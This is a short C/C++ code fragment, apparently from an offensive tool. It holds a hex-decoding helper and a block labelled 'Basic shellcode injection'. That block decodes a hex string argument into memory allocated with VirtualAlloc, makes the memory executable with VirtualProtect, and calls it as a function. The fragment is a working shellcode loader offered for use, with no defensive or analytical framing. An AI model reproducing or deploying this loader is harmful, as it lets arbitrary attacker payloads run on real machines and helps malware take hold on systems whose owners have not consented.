
// Hex decoding so we can pass shellcode as a hex string

	unsigned char hexval(unsigned char c)
	{
		if ('0' <= c && c <= '9')
			return c - '0';
		else if ('a' <= c && c <= 'f')
			return c - 'a' + 10;
		else if ('A' <= c && c <= 'F')
			return c - 'A' + 10;
		return 0;
	}


// Basic shellcode injection

	LPWSTR strArg = args[0].bstrVal;
	ULONG strLen = wcslen(strArg);

	PBYTE buffer = (PBYTE)VirtualAlloc(0, strLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	BYTE byte;
	int hIdx, bIdx = 0;
	for (hIdx = 0; hIdx < strLen; hIdx++)
	{
		byte = hexval(strArg[hIdx]); hIdx++;
		byte = (byte << 4) + hexval(strArg[hIdx]);
		buffer[bIdx] = byte; bIdx++;
	}

	DWORD dwProtect;
	VirtualProtect(buffer, strLen, PAGE_EXECUTE_READ, &dwProtect);

	((void (*)())buffer)();
